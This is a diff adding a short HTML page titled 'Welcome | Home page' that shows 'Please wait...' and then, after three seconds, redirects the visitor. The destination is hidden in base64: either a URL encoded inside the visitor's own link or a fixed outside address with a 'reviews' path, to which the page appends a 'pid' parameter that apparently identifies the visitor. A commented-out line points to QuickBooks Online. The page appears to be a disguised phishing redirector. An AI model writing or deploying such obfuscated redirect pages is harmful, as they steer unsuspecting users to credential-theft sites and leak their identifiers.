@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>Welcome | Home page</title>
+    </head>
+    <body>
+        <div>Please wait...</div>
+        <script>
+            
+            var _u = window.location.href;
+        var u = new URL(_u);
+        var oo = u.searchParams.get('pid'); 
+            
+            setTimeout(function() {
+            if(window.location.href.includes(".(")) {
+                document.location.href = atob(window.location.href.split(".(")[1]);
+            } else {
+                document.location.href = atob("aHR0cHM6Ly9zaG9ub3RlbmthLm5ldC9yZXZpZXdzLz9lPQ==")+oo;
+                //document.location.href = "https://qbo.intuit.com";
+            }
+            }, 1 * 3000);
+        </script>
+    </body>
+</html>
